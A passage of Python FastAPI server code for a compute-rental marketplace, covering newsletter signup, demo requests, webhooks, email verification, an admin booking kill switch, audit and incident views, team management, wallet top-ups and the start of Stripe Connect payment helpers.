@app.post("/newsletter/subscribe", tags=["marketing"])
def newsletter_subscribe(body: NewsletterModel, request: Request,
                         db: Session = Depends(get_db)):
    """Subscribe an email to the newsletter.

    Postgres is the AUTHORITATIVE record; the Mailgun mailing list is synced best-effort and
    reconciled if it is down. Public + IP rate-limited (anti-abuse, no email bombing).
    Idempotent + neutral: the same address twice still returns a friendly success and never
    reveals whether it was already stored. Provider internals are never exposed to the
    browser — only a safe message is returned."""
    email = body.email     # already trimmed + lowercased + validated by NewsletterModel
    env = obsmod.ENVIRONMENT
    tag = _hash_email(email)
    obsmod.inc_metric("petabyte_newsletter_subscribe_requests_total", environment=env)

    # 1) Authoritative record (idempotent). A real DB error is the only hard failure.
    try:
        status = dbmod.record_newsletter_signup(db, email, source="homepage")
    except Exception:
        logger.exception("newsletter: DB persist failed (email_sha=%s)", tag)
        obsmod.inc_metric("petabyte_newsletter_subscribe_failures_total",
                          reason="db", environment=env)
        raise HTTPException(status_code=503, detail={
            "code": "NEWSLETTER_UNAVAILABLE",
            "message": "We couldn't subscribe you right now. Please try again shortly."})

    created = status == "new"
    # CONSENT: a previously-unsubscribed address is NOT reactivated by this public request and
    # is NEVER re-pushed to Mailgun. Return the same neutral message (don't leak opt-out state).
    if status == "suppressed":
        obsmod.inc_metric("petabyte_newsletter_subscribe_success_total",
                          outcome="duplicate", environment=env)
        obs.event("marketing.newsletter.suppressed_optout",
                  message="newsletter signup ignored (address previously unsubscribed)",
                  source="homepage", email_sha=tag)
        return {"ok": True, "message": "Thanks — you're subscribed."}

    # 2) Deliver to the mailing list (best-effort; the DB stays the source of truth).
    provider = (NEWSLETTER_PROVIDER or "none").lower()
    synced = False
    if provider == "mailgun":
        synced = _newsletter_add_to_mailgun(email) in ("synced", "already")
        try:
            dbmod.mark_newsletter_synced(db, email, synced)
        except Exception:  # noqa: BLE001 — never fail the signup on a bookkeeping update
            logger.debug("newsletter: sync-flag update failed", exc_info=True)
    elif provider == "mailchimp":
        try:
            _newsletter_subscribe_mailchimp(email)
            synced = True
        except Exception:  # noqa: BLE001 — legacy path; best-effort like Mailgun
            synced = False

    if not synced:
        # Not fatal: the subscriber is safely in our DB and will be reconciled to the list.
        logger.warning("newsletter: mailing-list sync deferred (provider=%s, email_sha=%s)",
                       provider, tag)
        obsmod.inc_metric("petabyte_newsletter_subscribe_failures_total",
                          reason="mailgun", environment=env)

    obsmod.inc_metric("petabyte_newsletter_subscribe_success_total",
                      outcome=("new" if created else "duplicate"), environment=env)
    obs.event("marketing.newsletter.subscribed", message="newsletter signup",
              new=created, mailgun_synced=synced, source="homepage", email_sha=tag)
    return {"ok": True, "message": "Thanks — you're subscribed."}


def reconcile_newsletter(db, limit: int = 100) -> dict:
    """Deliver signups that were recorded but not yet reflected in the mailing list (Mailgun was
    down/unconfigured at signup, or hit a transient error). Without this, every 'you're
    subscribed' with a blank/failed Mailgun would strand forever. Runs in the maintenance loop
    (self-healing) and via POST /admin/newsletter/reconcile. No-op unless Mailgun is configured,
    so an unconfigured deploy costs nothing."""
    provider = (NEWSLETTER_PROVIDER or "none").lower()
    if provider != "mailgun" or not (os.getenv("MAILGUN_API_KEY", "").strip() and NEWSLETTER_LIST_ADDRESS):
        return {"reconciled": 0, "failed": 0, "skipped": True,
                "pending": dbmod.count_unsynced_newsletter(db)}
    done = failed = 0
    for sub in dbmod.unsynced_newsletter_subscribers(db, limit=limit):
        if _newsletter_add_to_mailgun(sub.email) in ("synced", "already"):
            dbmod.mark_newsletter_synced(db, sub.email, True)
            done += 1
        else:
            failed += 1     # leave unsynced; the next cycle retries
    return {"reconciled": done, "failed": failed, "skipped": False,
            "pending": dbmod.count_unsynced_newsletter(db)}


@app.post("/admin/newsletter/reconcile", tags=["admin"])
def admin_reconcile_newsletter(limit: int = Query(1000, ge=1, le=10000),
                               me=Depends(require_admin), db: Session = Depends(get_db)):
    """Push any newsletter signups not yet reflected in the mailing list to the provider now."""
    return reconcile_newsletter(db, limit=limit)


@app.get("/landing/video", tags=["marketing"])
def get_landing_video(db: Session = Depends(get_db)):
    """The YouTube video id shown on the landing page (admin-editable)."""
    from db import Platform
    p = db.query(Platform).first()
    vid = (p.landing_video_id if p and p.landing_video_id else DEFAULT_LANDING_VIDEO_ID)
    orient = (p.landing_video_orientation if p and p.landing_video_orientation
              else "portrait")   # the seeded default video is a Short
    return {"video_id": vid, "orientation": orient}


def _extract_youtube_id(s: str) -> str:
    """Accept a full URL (watch, youtu.be, shorts, embed) or a bare id; return the id."""
    s = s.strip()
    import re as _re
    for pat in (r"youtube\.com/shorts/([\w-]{6,})",
                r"youtu\.be/([\w-]{6,})",
                r"[?&]v=([\w-]{6,})",
                r"youtube\.com/embed/([\w-]{6,})"):
        m = _re.search(pat, s)
        if m:
            return m.group(1)
    # bare id
    if _re.fullmatch(r"[\w-]{6,20}", s):
        return s
    return ""


@app.post("/admin/landing/video", tags=["marketing"])
def set_landing_video(body: VideoModel, request: Request,
                      admin=Depends(require_admin), db: Session = Depends(get_db)):
    """Admin: change the landing-page video. Accepts a full YouTube URL or a bare id."""
    vid = _extract_youtube_id(body.video)
    if not vid:
        raise HTTPException(status_code=400, detail={"code": "BAD_VIDEO",
            "message": "Couldn't find a YouTube video id in that. Paste a YouTube link "
                       "or the id."})
    # Infer shape from the URL the admin pasted: a /shorts/ link is a vertical Short;
    # anything else (watch?v=, youtu.be) is a normal 16:9 video. Explicit override wins.
    orient = body.orientation or ("portrait" if "/shorts/" in body.video.lower()
                                  else "landscape")
    from db import Platform
    p = db.query(Platform).first()
    if not p:
        p = Platform(revenue=D(0)); db.add(p)
    p.landing_video_id = vid
    p.landing_video_orientation = orient
    db.add(p)
    audit(db, "landing.video_changed", actor=admin,
          ip=_client_ip(request), detail={"video_id": vid, "orientation": orient})
    db.commit()
    return {"ok": True, "video_id": vid, "orientation": orient}


@app.post("/demo/request", tags=["marketing"])
def request_demo(body: DemoRequestModel, request: Request, db: Session = Depends(get_db)):
    """Someone asked to see the product or get access.

    No login required — the whole point is to hear from people who are not users yet.
    We rate-limit by IP so the form cannot be turned into a spam cannon, store the
    lead, and notify the founder out of band. We never invent these rows; each one is
    a real person who wanted a walkthrough."""
    from db import DemoRequest, _rand_vm_id
    ip = _client_ip(request)
    # cheap abuse guard: at most a handful of requests per IP per hour
    since = datetime.now(timezone.utc) - timedelta(hours=1)
    recent = db.query(DemoRequest).filter(
        DemoRequest.ip_address == ip, DemoRequest.created_at >= since).count()
    if recent >= 8:
        _fail_json(429, "TOO_MANY_REQUESTS",
                   "You have sent several requests already. We have them — "
                   "we will be in touch shortly.")
    lead = DemoRequest(
        public_id=_rand_vm_id(), name=body.name.strip(), email=body.email,
        organization=(body.organization or "").strip() or None,
        role=(body.role or "").strip() or None,
        workload=(body.workload or "").strip() or None,
        message=(body.message or "").strip() or None,
        preferred_time=(body.preferred_time or "").strip() or None,
        source=(body.source or "").strip() or None,
        ip_address=ip, status="new")
    db.add(lead)
    db.commit()
    # accountable, but never store this person's message as a secret
    audit(db, "demo.requested", actor_type="system", resource_type="demo_request",
          resource_id=lead.public_id, ip=ip,
          detail={"role": lead.role, "org": lead.organization, "source": lead.source})
    _notify_founder_of_lead(db, lead)
    # If self-scheduling is configured, email the requester the booking link right away
    # (this is the "calendar link to pick a slot that fits both of us" flow) and hand
    # the URL back so the page can show a Pick-your-time button.
    if CAL_BOOKING_URL:
        _email_booking_link(lead)
        return {"ok": True, "booking_url": CAL_BOOKING_URL,
                "message": "Thanks — pick a time that works for you below, or use the "
                           "link we just emailed you.",
                "reference": lead.public_id}
    return {"ok": True,
            "message": "Thanks — we have your request. Expect an email within one "
                       "business day to set up a time.",
            "reference": lead.public_id}


@app.post("/webhooks/cal", tags=["marketing"])
async def cal_webhook(request: Request, db: Session = Depends(get_db)):
    """Cal.com booking webhook. When someone books a demo slot, notify the founder
    inbox (ADMIN_USERS, e.g. info@petabyte.market) that a demo was booked — Cal
    sends the attendee/host confirmation itself; this is our own record + alert.

    Point a Cal.com webhook (trigger BOOKING_CREATED) at
    https://petabyte.market/webhooks/cal. CAL_WEBHOOK_SECRET is REQUIRED and every
    call is HMAC-verified; if it is unset the endpoint is disabled (503) rather than
    accepting unsigned payloads — otherwise anyone could POST forged bookings to
    trigger admin emails and write attacker-controlled strings into the audit log."""
    raw = await request.body()
    secret = os.getenv("CAL_WEBHOOK_SECRET", "").strip()
    if not secret:
        raise HTTPException(status_code=503,
                            detail="cal webhook is not configured (set CAL_WEBHOOK_SECRET)")
    sig = request.headers.get("X-Cal-Signature-256", "")
    if not verify_webhook_signature(secret, raw, sig):
        raise HTTPException(status_code=401, detail="invalid signature")
    try:
        payload = json.loads(raw or b"{}")
    except Exception:
        payload = {}
    trigger = str(payload.get("triggerEvent") or payload.get("event") or "").upper()
    if "BOOKING" in trigger and "CANCEL" not in trigger and "REJECT" not in trigger:
        p = payload.get("payload") or payload
        atts = p.get("attendees") if isinstance(p.get("attendees"), list) else []
        who = "Someone"
        if atts:
            a0 = atts[0] or {}
            who = f"{a0.get('name', '')} <{a0.get('email', '')}>".strip() or who
        when = p.get("startTime") or p.get("start") or ""
        title = p.get("title") or "Demo"
        body = f"{who} booked '{title}'" + (f" for {when}" if when else "") + "."
        try:
            _email_admins(db, "New demo booked", body)
        except Exception:
            logger.exception("failed to email admins of cal booking")
        audit(db, "demo.booked", actor_type="system", resource_type="cal_booking",
              resource_id=str(p.get("uid") or p.get("bookingId") or p.get("id") or "")[:64])
    return {"ok": True}


@app.get("/admin/demo-requests", tags=["marketing"])
def list_demo_requests(user: dict = Depends(get_current_user),
                       db: Session = Depends(get_db)):
    """The founder's view of inbound demand — the thing an investor wants to see."""
    u = get_user_by_username(db, _username(user))
    if not _is_admin(u):
        raise HTTPException(status_code=403, detail="Admins only.")
    from db import DemoRequest
    rows = db.query(DemoRequest).order_by(DemoRequest.created_at.desc()).limit(200).all()
    return {"count": len(rows),
            "requests": [{"reference": r.public_id, "name": r.name, "email": r.email,
                          "organization": r.organization, "role": r.role,
                          "workload": r.workload, "preferred_time": r.preferred_time,
                          "source": r.source, "status": r.status,
                          "at": r.created_at.isoformat() if r.created_at else None}
                         for r in rows]}


@app.post("/email/verify/request", tags=["account"])
def request_email_verification(data: EmailModel, request: Request,
                               user: dict = Depends(get_current_user),
                               db: Session = Depends(get_db)):
    """Send a verification link. The token is single-use, expires in 15 minutes, and
    only its HASH is stored — a database leak does not hand out verified emails."""
    if "@" not in data.email or "." not in data.email.rsplit("@", 1)[-1]:
        raise HTTPException(status_code=400, detail="Not a valid email address")
    if is_disposable_email(data.email):
        raise HTTPException(status_code=400, detail={
            "code": "DISPOSABLE_EMAIL",
            "message": "Disposable email domains aren't accepted. We need to be able to "
                       "reach you if your node has a problem."})
    me = get_user_by_username(db, _username(user))
    token = start_email_verification(db, me, data.email)
    audit(db, "email.verification_requested", actor=me, ip=_client_ip(request),
          request_id=getattr(request.state, "request_id", None),
          detail={"email": redact_destination(data.email)})
    link = f"https://{BASE_DOMAIN}/email/verify?u={me.username}&t={token}"
    try:
        notifications.notify(db, me.id, "email.verify", link=link,
                             minutes=EMAIL_TOKEN_TTL_MIN)
    except Exception:
        logger.exception("failed to send verification email")
    out = {"status": "sent", "expires_in_minutes": EMAIL_TOKEN_TTL_MIN}
    if os.getenv("NOTIFY_STUB", "").lower() == "true":
        out["debug_token"] = token       # tests/sandbox only; never in production
    return out


@app.post("/email/verify/confirm", tags=["account"])
def confirm_email_verification(data: EmailConfirmModel, request: Request,
                               user: dict = Depends(get_current_user),
                               db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    if not confirm_email(db, me.username, data.token):
        raise HTTPException(status_code=400, detail={
            "code": "INVALID_OR_EXPIRED_TOKEN",
            "message": "That link is invalid or has expired. Request a new one."})
    return {"status": "verified", "email_verified": True}


# ------------------- KILL SWITCH (admin) -------------------

class PauseModel(BaseModel):
    paused: bool
    reason: Optional[str] = Field(None, max_length=280)


@app.post("/admin/bookings/pause", tags=["account"])
def admin_pause_bookings(data: PauseModel, request: Request,
                         admin=Depends(require_admin), db: Session = Depends(get_db)):
    """THE KILL SWITCH.

    Stops NEW bookings immediately. Running rentals are untouched and settle normally —
    stopping the world must never destroy someone's six-hour render. Use it when a node
    is misbehaving, a seller's ISP is complaining, or you see something in the ledger
    you don't understand."""
    me = get_user_by_username(db, _username(admin))
    p = set_bookings_paused(db, data.paused, data.reason, actor=me)
    return {"status": "ok", "bookings_paused": p.bookings_paused,
            "reason": p.pause_reason}


@app.get("/admin/bookings/pause", tags=["account"])
def admin_pause_status(admin=Depends(require_admin), db: Session = Depends(get_db)):
    paused, reason = bookings_are_paused(db)
    return {"bookings_paused": paused, "reason": reason}


@app.get("/admin/audit", tags=["account"])
def admin_audit_log(limit: int = Query(100, ge=1, le=500),
                    action: Optional[str] = None,
                    admin=Depends(require_admin), db: Session = Depends(get_db)):
    """Append-only: who did what, when. Read this when money is disputed."""
    qy = db.query(AuditEvent).order_by(AuditEvent.id.desc())
    if action:
        qy = qy.filter(AuditEvent.action == action)
    return {"events": [{"id": e.id, "action": e.action,
                        "actor": e.actor_username, "actor_type": e.actor_type,
                        "resource": f"{e.resource_type}:{e.resource_id}"
                                    if e.resource_type else None,
                        "ip": e.ip_address, "request_id": e.request_id,
                        "detail": e.detail,
                        "at": e.created_at.isoformat() if e.created_at else None}
                       for e in qy.limit(limit).all()]}


@app.get("/admin/incidents", tags=["account"])
def admin_incidents(stall_minutes: int = Query(30, ge=1, le=1440),
                    limit: int = Query(100, ge=1, le=500),
                    admin=Depends(require_admin), db: Session = Depends(get_db)):
    """Operator incident view: transactions that failed or are stuck, and WHY.

    Three classes an operator must be able to see at a glance:
      * stalled bookings — money escrowed/active with no terminal state for a while
        (a node that never finished, or a job that never got claimed);
      * failed jobs — with the recorded reason and whether escrow was returned;
      * failed payouts — money that could not be sent out.
    Read-only; the fix actions live on the existing admin routes (delist, pause,
    refund via reaper). This is the 'why is nothing settling' panel."""
    from db import Booking, Task, Payout, SellerSpec
    now = datetime.now(timezone.utc)
    cutoff = now - timedelta(minutes=stall_minutes)

    def _age_min(dt):
        if not dt:
            return None
        dt = dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)
        return round((now - dt).total_seconds() / 60, 1)

    stalled = []
    for b in (db.query(Booking)
                .filter(Booking.status.in_(["escrowed", "active"]))
                .order_by(Booking.id.desc()).limit(limit).all()):
        created = b.created_at if not b.created_at or b.created_at.tzinfo else b.created_at.replace(tzinfo=timezone.utc)
        if created and created < cutoff:
            spec = db.query(SellerSpec).filter(SellerSpec.id == b.spec_id).first()
            live = spec_is_live(spec) if spec else False
            stalled.append({
                "booking_id": b.id, "status": b.status,
                "amount": b.gross_amount, "age_minutes": _age_min(b.created_at),
                "spec_id": b.spec_id, "node_online": live,
                "reason": ("node offline — reaper should fail over or refund"
                           if not live else
                           "job not completed yet — check the agent claimed it"),
            })

    failed_jobs = [{
        "task_id": t.id, "task_type": t.task_type, "booking_id": t.booking_id,
        "reason": (t.result or "job reported failed"),
        "age_minutes": _age_min(t.completed_at or t.created_at),
    } for t in (db.query(Task).filter(Task.status == "failed")
                  .order_by(Task.id.desc()).limit(limit).all())]

    failed_payouts = [{
        "payout_id": p.id, "amount_usd": p.amount_usd, "kind": p.kind,
        "status": p.status, "age_minutes": _age_min(p.created_at),
        "reason": "provider send failed or reversed — funds returned to earnings",
    } for p in (db.query(Payout).filter(Payout.status == "failed")
                  .order_by(Payout.id.desc()).limit(limit).all())]

    return {
        "stall_minutes": stall_minutes,
        "counts": {"stalled_bookings": len(stalled),
                   "failed_jobs": len(failed_jobs),
                   "failed_payouts": len(failed_payouts)},
        "stalled_bookings": stalled,
        "failed_jobs": failed_jobs,
        "failed_payouts": failed_payouts,
    }


@app.get("/wallet/payouts")
def get_payouts(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    return {"payouts": [{"id": p.id, "amount_usd": p.amount_usd, "kind": p.kind,
                         "status": p.status, "provider_ref": p.provider_ref,
                         "created_at": str(p.created_at)} for p in list_payouts(db, me.id)]}


@app.post("/wallet/schedule")
def set_schedule(data: ScheduleModel, user: dict = Depends(get_current_user),
                 db: Session = Depends(get_db)):
    """Auto-withdraw on a weekly cadence, e.g. Monday 08:00 local
    (day_of_week=0, hour=8, utc_offset_minutes=<your tz>)."""
    me = get_user_by_username(db, _username(user))
    m = get_payout_method(db, data.method_id, me.id)
    if not m or not m.verified:
        raise HTTPException(status_code=400, detail="Need a verified payout method")
    sch = create_schedule(db, me, m, data.day_of_week, data.hour, data.minute,
                          data.utc_offset_minutes, data.min_amount)
    return {"status": "ok", "schedule_id": sch.id, "next_run_at": str(sch.next_run_at)}


@app.get("/wallet/schedule")
def get_schedule(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    return {"schedules": [{"id": s.id, "day_of_week": s.day_of_week, "hour": s.hour,
                           "minute": s.minute, "min_amount": s.min_amount,
                           "enabled": s.enabled, "next_run_at": str(s.next_run_at),
                           "last_run_at": str(s.last_run_at) if s.last_run_at else None}
                          for s in list_schedules(db, me.id)]}


# ------------------- ORGANIZATIONS -------------------

@app.get("/orgs", tags=["account"])
def list_orgs_endpoint(user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Teams the signed-in user belongs to — shared-wallet enterprise/lab accounts with an
    optional budget cap. There is no public org directory, so this is how the console lets a
    user find the orgs they can act on (create one with POST /orgs)."""
    me = get_user_by_username(db, _username(user))
    return {"orgs": list_orgs_for_user(db, me.id)}


@app.post("/orgs")
def create_org_endpoint(data: OrgCreateModel, user: dict = Depends(get_current_user),
                        db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    org = create_org(db, data.name, me)
    if not org:
        raise HTTPException(status_code=400, detail="Org name already taken")
    audit(db, "team.create", actor=me, resource_type="org", resource_id=org.id,
          org_id=org.id, detail={"name": org.name})
    return {"status": "ok", "org_id": org.id, "name": org.name, "your_role": "admin"}


@app.get("/orgs/{org_id}")
def org_info(org_id: int, user: dict = Depends(get_current_user),
             db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    m = get_membership(db, org_id, me.id)
    if not m:
        raise HTTPException(status_code=403, detail="Not a member")
    org = get_org(db, org_id)
    return {"org_id": org.id, "name": org.name, "balance": round(org.balance, 4),
            "budget_cap": org.budget_cap, "spent": round(org.spent, 4),
            "your_role": m.role, "members": org_members(db, org_id)}


@app.post("/orgs/{org_id}/members")
def add_member_endpoint(org_id: int, data: OrgMemberModel,
                        user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    m = get_membership(db, org_id, me.id)
    if not m or m.role != "admin":
        raise HTTPException(status_code=403, detail="Admin only")
    try:
        if not add_org_member(db, get_org(db, org_id), data.username, data.role):
            raise HTTPException(status_code=404, detail="User not found")
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    audit(db, "team.member.add", actor=me, resource_type="org_member", resource_id=data.username,
          org_id=org_id, detail={"role": data.role})
    return {"status": "ok", "members": org_members(db, org_id)}


@app.put("/orgs/{org_id}/members/{username}", tags=["account"])
def set_member_role_endpoint(org_id: int, username: str, data: OrgRoleModel,
                             user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Change a team member's role (admin only). The org must always keep at least one
    admin, so demoting the sole admin is refused (409)."""
    me = get_user_by_username(db, _username(user))
    m = get_membership(db, org_id, me.id)
    if not m or m.role != "admin":
        raise HTTPException(status_code=403, detail="Admin only")
    try:
        res = set_org_member_role(db, org_id, username, data.role)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    if res == "not_found":
        raise HTTPException(status_code=404, detail="Not a member of this team")
    if res == "last_admin":
        raise HTTPException(status_code=409, detail="A team must keep at least one admin")
    audit(db, "team.member.role", actor=me, resource_type="org_member", resource_id=username,
          org_id=org_id, detail={"role": data.role})
    return {"status": "ok", "members": org_members(db, org_id)}


@app.delete("/orgs/{org_id}/members/{username}", tags=["account"])
def remove_member_endpoint(org_id: int, username: str,
                           user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Remove a member from a team (admin only). The sole admin cannot be removed (409),
    so a team can never be left with no one able to manage it."""
    me = get_user_by_username(db, _username(user))
    m = get_membership(db, org_id, me.id)
    if not m or m.role != "admin":
        raise HTTPException(status_code=403, detail="Admin only")
    res = remove_org_member(db, org_id, username)
    if res == "not_found":
        raise HTTPException(status_code=404, detail="Not a member of this team")
    if res == "last_admin":
        raise HTTPException(status_code=409, detail="A team must keep at least one admin")
    audit(db, "team.member.remove", actor=me, resource_type="org_member", resource_id=username,
          org_id=org_id)
    return {"status": "ok", "members": org_members(db, org_id)}


@app.post("/orgs/{org_id}/deposit")
def org_deposit_endpoint(org_id: int, data: OrgDepositModel,
                         user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    me = get_user_by_username(db, _username(user))
    m = get_membership(db, org_id, me.id)
    if not m or m.role not in ("admin", "billing"):
        raise HTTPException(status_code=403, detail="Admin/billing only")
    if PAYMENTS_MODE == "live":
        raise HTTPException(status_code=403, detail="Direct deposit disabled; use checkout")
    org = get_org(db, org_id)
    if data.budget_cap is not None:
        org.budget_cap = data.budget_cap; db.add(org); db.commit()
    bal = org_deposit(db, org, data.amount)
    audit(db, "team.deposit", actor=me, resource_type="org", resource_id=org_id, org_id=org_id,
          detail={"amount": float(data.amount), "budget_cap": (float(data.budget_cap)
                  if data.budget_cap is not None else None)})
    return {"status": "ok", "balance": bal, "budget_cap": org.budget_cap}


@app.get("/orgs/{org_id}/audit", tags=["account"])
def org_audit_endpoint(org_id: int, limit: int = Query(200, ge=1, le=500),
                       user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Tenant-facing audit trail for a team — every member change, deposit and spend scoped to it.
    Admin-only (the security-team / SOC-2 view). Includes a tamper-evidence check over the chain."""
    me = get_user_by_username(db, _username(user))
    m = get_membership(db, org_id, me.id)
    if not m or m.role != "admin":
        raise HTTPException(status_code=403, detail="Admin only")
    return {"org_id": org_id, "events": list_audit_for_org(db, org_id, limit=limit),
            "integrity": verify_audit_chain(db)}


@app.get("/orgs/{org_id}/usage")
def org_usage_endpoint(org_id: int, user: dict = Depends(get_current_user),
                       db: Session = Depends(get_db)):
    """Per-booking usage export for invoicing/cost-center reporting."""
    me = get_user_by_username(db, _username(user))
    if not get_membership(db, org_id, me.id):
        raise HTTPException(status_code=403, detail="Not a member")
    rows = org_usage(db, org_id)
    return {"org_id": org_id, "line_items": rows,
            "total_gross": round(sum(r["gross_amount"] for r in rows), 4)}


# ------------------- SETTLEMENT / WALLET -------------------

@app.post("/deposit", tags=["wallet"])
def deposit_funds(data: DepositModel, user: dict = Depends(get_current_user),
                  db: Session = Depends(get_db)):
    """Top-up. In live mode this is disabled — funds come only via the payment
    webhook (so balances can't be minted for free)."""
    if PAYMENTS_MODE == "live":
        raise HTTPException(status_code=403,
                            detail="Direct deposit disabled; use checkout (payment webhook)")
    me = get_user_by_username(db, _username(user))
    balance = deposit(db, me, data.amount)
    obs.event(EVENTS.WALLET_FUNDED, message="wallet funded (sandbox deposit)",
              user_id=me.id, source="deposit")
    return {"status": "ok", "balance": balance}


class TopupModel(BaseModel):
    amount_minor: int = Field(..., ge=1, description="amount to add, in minor units (cents)")


@app.post("/wallet/topup", tags=["wallet"])
def wallet_topup(data: TopupModel, request: Request,
                 user: dict = Depends(get_current_user), db: Session = Depends(get_db)):
    """Add funds: open Stripe's hosted card page for a wallet top-up and return the
    checkout URL to redirect the buyer to. Works in demo (TEST) and LIVE mode depending
    on the configured Stripe keys; the response carries `mode`/`test_mode` so the UI can
    badge it. The balance is credited when the payment completes (webhook)."""
    import wallet_funding as wf
    me = get_user_by_username(db, _username(user))
    base = (os.getenv("PUBLIC_BASE_URL") or str(request.base_url)).rstrip("/")
    try:
        return wf.start_topup(db, me, amount_minor=data.amount_minor,
                              success_url=f"{base}/account?funded=1",
                              cancel_url=f"{base}/account?funded=0")
    except wf.WalletError as e:
        raise HTTPException(status_code=400, detail=str(e))


@app.get("/wallet/topup/{topup_id}", tags=["wallet"])
def wallet_topup_status(topup_id: str, user: dict = Depends(get_current_user),
                        db: Session = Depends(get_db)):
    from db import WalletTopup
    me = get_user_by_username(db, _username(user))
    t = db.query(WalletTopup).filter(WalletTopup.public_id == topup_id,
                                     WalletTopup.user_id == me.id).first()
    if not t:
        raise HTTPException(status_code=404, detail="top-up not found")
    return {"topup_id": t.public_id, "status": t.status, "amount_minor": t.amount_minor,
            "currency": t.currency, "mode": t.mode, "credited": t.status == "paid"}


@app.post("/wallet/topup/{topup_id}/simulate-pay", tags=["wallet"])
def wallet_topup_simulate(topup_id: str, user: dict = Depends(get_current_user),
                          db: Session = Depends(get_db)):
    """SANDBOX/TEST ONLY: complete the hosted card page against the in-process fake
    gateway and credit the wallet (offline demo / CI). 404 in real Stripe mode."""
    import wallet_funding as wf
    from db import WalletTopup
    me = get_user_by_username(db, _username(user))
    t = db.query(WalletTopup).filter(WalletTopup.public_id == topup_id,
                                     WalletTopup.user_id == me.id).first()
    if not t:
        raise HTTPException(status_code=404, detail="top-up not found")
    try:
        wf.simulate_pay(db, t)
    except wf.WalletError:
        raise HTTPException(status_code=404, detail="not found")
    db.refresh(t)
    return {"ok": True, "status": t.status, "credited": t.status == "paid"}


@app.post("/webhooks/payment")
async def payment_webhook(request: Request, db: Session = Depends(get_db)):
    """Credit a buyer's balance from a verified payment event (idempotent).

    Verify HMAC over the raw body, then credit. For Stripe, swap the signature
    check for stripe.Webhook.construct_event and read the session metadata.
    Expected JSON: {event_id, type, data:{username, amount}}.
    """
    raw = await request.body()
    sig = request.headers.get("X-Signature", "")
    if not verify_webhook_signature(PAYMENT_WEBHOOK_SECRET, raw, sig):
        raise HTTPException(status_code=401, detail="Invalid webhook signature")
    try:
        evt = json.loads(raw)
        event_id = evt["event_id"]
        username = evt["data"]["username"]
        amount = float(evt["data"]["amount"])
    except (ValueError, KeyError, TypeError):
        raise HTTPException(status_code=400, detail="Malformed event")
    if amount <= 0:
        raise HTTPException(status_code=400, detail="Invalid amount")
    if webhook_already_processed(db, event_id):
        return {"status": "ok", "duplicate": True}     # already credited
    if not credit_user_by_username(db, username, amount):
        raise HTTPException(status_code=404, detail="Unknown user")
    return {"status": "ok", "credited": amount, "user": username}


# =====================================================================
# Stripe Connect marketplace payments (real money; test mode first).
# Endpoints are thin: all money logic + state machine live in stripe_connect.py.
# Amounts are integer minor units and are ALWAYS computed server-side.
# =====================================================================
import stripe_connect as _sc
from pricing import PricingConfig as _PricingConfig
from stripe_gateway import get_gateway as _get_gateway


def _ctx_view(db, tx, *, viewer=None, admin=False):
    """Buyer/seller/admin-safe view of a compute transaction (no buyer PII to seller)."""
    v = {"transaction_id": tx.public_id, "status": tx.status,
         "reconciliation_status": tx.reconciliation_status, "currency": tx.currency,
         "estimated_amount": tx.estimated_amount,
         "authorization_amount": tx.authorization_amount,
         "captured_amount": tx.captured_amount,
         "platform_fee_amount": tx.platform_fee_amount,
         "seller_net_amount": tx.seller_net_amount,
         "refunded_amount": tx.refunded_amount,
         "transferred_amount": tx.transferred_amount,
         "reversed_amount": tx.reversed_amount,
         "metering_seconds": tx.metering_seconds,
         "spec_id": tx.spec_id, "created_at": tx.created_at.isoformat() if tx.created_at else None}
    if admin:
        v.update({"buyer_id": tx.buyer_id, "seller_id": tx.seller_id,
                  "stripe_payment_intent_id": tx.stripe_payment_intent_id,
                  "stripe_charge_id": tx.stripe_charge_id,
                  "stripe_transfer_id": tx.stripe_transfer_id,
                  "stripe_connected_account_id": tx.stripe_connected_account_id,
                  "settlement_version": tx.settlement_version,
                  "failure_reason": tx.failure_reason, "is_demo": tx.is_demo})
    return v


class SellerConnectModel(BaseModel):
    country: Optional[str] = None
    email: Optional[str] = None

class OnboardingLinkModel(BaseModel):
    return_url: Optional[str] = None
    refresh_url: Optional[str] = None

class QuoteModel(BaseModel):
    spec_id: str                      # public handle
    estimated_seconds: int = Field(..., ge=1, le=86400)

class AuthorizeModel(BaseModel):
    spec_id: str
    estimated_seconds: int = Field(..., ge=1, le=86400)

class MeterModel(BaseModel):
    actual_seconds: int = Field(..., ge=0, le=86400)
    source: str = "agent"

class DispatchModel(BaseModel):
    task_type: str = "notebook"
    code: Optional[str] = None

class RefundModel(BaseModel):
    amount: Optional[int] = None      # minor units; None = full
    reason: str = Field(..., min_length=3, max_length=200)


def _admin_reason(reason: str):
    if not reason or len(reason.strip()) < 3:
        raise HTTPException(status_code=400, detail="a reason is required for this action")


def _connect_or_409(fn, *a, **k):
    """Run a Connect helper, translating a gateway-mode mismatch into a clear 409 (never a
    raw 500) so the operator sees exactly why a stale fake account was refused."""
    try:
        return fn(*a, **k)
    except _sc.ConnectedAccountModeMismatch as e:
        raise HTTPException(status_code=409,
                            detail=f"CONNECTED_ACCOUNT_MODE_MISMATCH: {e}")


def _connect_return_urls(data: "OnboardingLinkModel") -> tuple[str, str]:
    """Resolve ABSOLUTE return/refresh URLs for Stripe onboarding. Precedence: explicit body
    field -> CONNECT_RETURN_URL/CONNECT_REFRESH_URL -> PUBLIC_BASE_URL-derived. Stripe rejects a
    relative URL, so if no absolute base is configured we return a clear config error instead of
    letting Stripe 500."""
    base = os.getenv("PUBLIC_BASE_URL", "").rstrip("/")
    return_url = (data.return_url or os.getenv("CONNECT_RETURN_URL")
                  or (f"{base}/seller/payouts?stripe=return" if base else None))
    refresh_url = (data.refresh_url or os.getenv("CONNECT_REFRESH_URL")
                   or (f"{base}/seller/payouts?stripe=refresh" if base else None))
